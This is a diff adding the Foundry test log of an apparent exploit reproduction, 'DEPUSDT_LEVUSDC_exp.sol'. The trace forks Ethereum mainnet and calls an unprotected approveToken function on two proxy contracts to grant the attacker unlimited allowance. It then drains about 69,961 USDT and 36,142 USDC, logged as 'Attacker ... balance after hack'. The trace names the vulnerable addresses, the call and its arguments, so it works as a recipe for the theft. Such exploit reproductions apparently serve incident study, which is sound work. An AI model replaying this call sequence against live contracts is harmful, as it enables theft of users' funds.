@@ -1,0 +1,85 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/DEPUSDT_LEVUSDC_exp.sol:ContractTest
+[PASS] testApprove() (gas: 192167)
+Logs:
+  Attacker DEPUSDT balance after hack: 69961.509697
+  Attacker LEVUSDC balance after hack: 36142.023929
+
+Traces:
+  [17785] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("mainnet", 17484161 [1.748e7])
+    │   └─ ← [Return] 0
+    ├─ [0] VM::label(DEPUSDT: [0xdAC17F958D2ee523a2206206994597C13D831ec7], "DEPUSDT")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(LEVUSDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], "LEVUSDC")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(ProxyDEPUSDT: [0x7b190a928Aa76EeCE5Cb3E0f6b3BdB24fcDd9b4f], "ProxyDEPUSDT")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(ProxyLEVUSDC: [0x2a2b195558cF89AA617979ce28880BbF7e17bc45], "ProxyLEVUSDC")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [201767] ContractTest::testApprove()
+    ├─ [40579] ProxyDEPUSDT::approveToken(DEPUSDT: [0xdAC17F958D2ee523a2206206994597C13D831ec7], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─ [33251] 0x94290106D2A32Bc89BE9f1c3a3f3394F64578AA6::approveToken(DEPUSDT: [0xdAC17F958D2ee523a2206206994597C13D831ec7], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
+    │   │   ├─ [5356] DEPUSDT::allowance(ProxyDEPUSDT: [0x7b190a928Aa76EeCE5Cb3E0f6b3BdB24fcDd9b4f], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ [22953] DEPUSDT::approve(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ emit Approval(owner: ProxyDEPUSDT: [0x7b190a928Aa76EeCE5Cb3E0f6b3BdB24fcDd9b4f], spender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x6186f2fceb08ad0f8661e775837dabdbc819cf9b46ca8f048a0689c6f8e5074e: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   └─ ← [Stop]
+    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    ├─ [3031] DEPUSDT::balanceOf(ProxyDEPUSDT: [0x7b190a928Aa76EeCE5Cb3E0f6b3BdB24fcDd9b4f]) [staticcall]
+    │   └─ ← [Return] 69961509697 [6.996e10]
+    ├─ [37630] DEPUSDT::transferFrom(ProxyDEPUSDT: [0x7b190a928Aa76EeCE5Cb3E0f6b3BdB24fcDd9b4f], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 69961509697 [6.996e10])
+    │   ├─ emit Transfer(from: ProxyDEPUSDT: [0x7b190a928Aa76EeCE5Cb3E0f6b3BdB24fcDd9b4f], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 69961509697 [6.996e10])
+    │   ├─  storage changes:
+    │   │   @ 0x6aef512ad7624fe2fa7f06cd6d0221a53b6fb05fe33f26c718cf4e9c8a0baef4: 0x000000000000000000000000000000000000000000000000000000104a07eb41 → 0
+    │   │   @ 0x6e10ff27cae71a13525bd61167857e5c982b4674c8e654900e4e9d5035811f78: 0 → 0x000000000000000000000000000000000000000000000000000000104a07eb41
+    │   └─ ← [Stop]
+    ├─ [0] VM::roll(17484167 [1.748e7])
+    │   └─ ← [Return]
+    ├─ [52007] ProxyLEVUSDC::approveToken(LEVUSDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─ [44679] 0x27C55a6bd85e79C70C9B2CAA003D55A2EcE01565::approveToken(LEVUSDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
+    │   │   ├─ [9926] LEVUSDC::allowance(ProxyLEVUSDC: [0x2a2b195558cF89AA617979ce28880BbF7e17bc45], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   ├─ [2637] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::allowance(ProxyLEVUSDC: [0x2a2b195558cF89AA617979ce28880BbF7e17bc45], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ [29767] LEVUSDC::approve(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ [28978] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::approve(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
+    │   │   │   │   ├─ emit Approval(owner: ProxyLEVUSDC: [0x2a2b195558cF89AA617979ce28880BbF7e17bc45], spender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xbf5b6604c385dc287417bb8c9d597852aaeb4fe2bfb45c7fb85155f39bda24e4: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    ├─ [3315] LEVUSDC::balanceOf(ProxyLEVUSDC: [0x2a2b195558cF89AA617979ce28880BbF7e17bc45]) [staticcall]
+    │   ├─ [2529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(ProxyLEVUSDC: [0x2a2b195558cF89AA617979ce28880BbF7e17bc45]) [delegatecall]
+    │   │   └─ ← [Return] 36142023929 [3.614e10]
+    │   └─ ← [Return] 36142023929 [3.614e10]
+    ├─ [30692] LEVUSDC::transferFrom(ProxyLEVUSDC: [0x2a2b195558cF89AA617979ce28880BbF7e17bc45], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 36142023929 [3.614e10])
+    │   ├─ [29897] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::transferFrom(ProxyLEVUSDC: [0x2a2b195558cF89AA617979ce28880BbF7e17bc45], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 36142023929 [3.614e10]) [delegatecall]
+    │   │   ├─ emit Transfer(from: ProxyLEVUSDC: [0x2a2b195558cF89AA617979ce28880BbF7e17bc45], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 36142023929 [3.614e10])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xea80dd88ed2c8da1b3cfa53b6b2568ae58fe83d484d0c01324a62ba1aa9ffdac: 0 → 0x000000000000000000000000000000000000000000000000000000086a3b84f9
+    │   │   │   @ 0xbf5b6604c385dc287417bb8c9d597852aaeb4fe2bfb45c7fb85155f39bda24e4: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffff795c47b06
+    │   │   │   @ 0xdd987474a3f867add2f59eddb172c1904907b61c2ddac42a353561f149ebe162: 0x000000000000000000000000000000000000000000000000000000086a3b84f9 → 0
+    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    ├─ [1031] DEPUSDT::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 69961509697 [6.996e10]
+    ├─ emit log_named_decimal_uint(key: "Attacker DEPUSDT balance after hack", val: 69961509697 [6.996e10], decimals: 6)
+    ├─ [1315] LEVUSDC::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   ├─ [529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   └─ ← [Return] 36142023929 [3.614e10]
+    │   └─ ← [Return] 36142023929 [3.614e10]
+    ├─ emit log_named_decimal_uint(key: "Attacker LEVUSDC balance after hack", val: 36142023929 [3.614e10], decimals: 6)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 7.37s (6.03s CPU time)
+
+Ran 1 test suite in 7.37s (7.37s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
